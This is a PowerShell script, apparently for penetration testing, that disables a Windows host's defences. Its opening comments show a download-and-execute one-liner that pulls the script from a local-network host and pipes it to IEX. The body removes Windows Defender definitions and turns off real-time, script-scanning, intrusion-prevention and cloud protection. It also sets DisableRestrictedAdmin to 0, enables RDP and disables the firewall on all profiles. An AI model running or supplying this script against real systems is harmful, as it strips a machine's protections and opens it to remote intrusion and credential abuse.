# (New-Object System.Net.WebClient).DownloadString("http://192.168.XXX.XXX/Disabled_AV.ps1") | IEX
# irm http://192.168.x.x/Disabled_AV.ps1 | IEX

# --- Roll back Defender definitions ---
cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all

# --- Disable Windows Defender Real-Time Monitoring ---
Set-MpPreference -DisableRealtimeMonitoring $true

# --- Disable various Windows Defender protection features ---
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisablePrivacyMode $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableScriptScanning $true

# --- Disable Cloud-delivered Protection ---
Set-MpPreference -MAPSReporting Disabled

# --- Disable Automatic Sample Submission ---
Set-MpPreference -SubmitSamplesConsent NeverSend

# --- Disable Real-time Protection exclusions ---
Set-MpPreference -DisableAutoExclusions $true

# --- Configure Potentially Unwanted Application (PUA) protection ---
Set-MpPreference -PUAProtection 0

# --- Registry modifications for RDP and admin settings ---
# Disable RestrictedAdmin mode
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
# If needed, manually set using cmd:
# reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# Enable RDP connections
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# --- Disable Windows Firewall for all profiles ---
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# --- (Optional) Fully disable Windows Defender features (use with caution) ---
# Disable-WindowsOptionalFeature -Online -FeatureName Windows-Defender-Features

# --- Function to check and display the current Windows Defender settings ---
function Check-DefenderStatus {
    Get-MpPreference
}

# --- Execute the function to show the Defender status ---
Check-DefenderStatus

# --- Reminder message ---
Write-Host "All security settings have been disabled. Ensure to re-enable after testing." -ForegroundColor Red
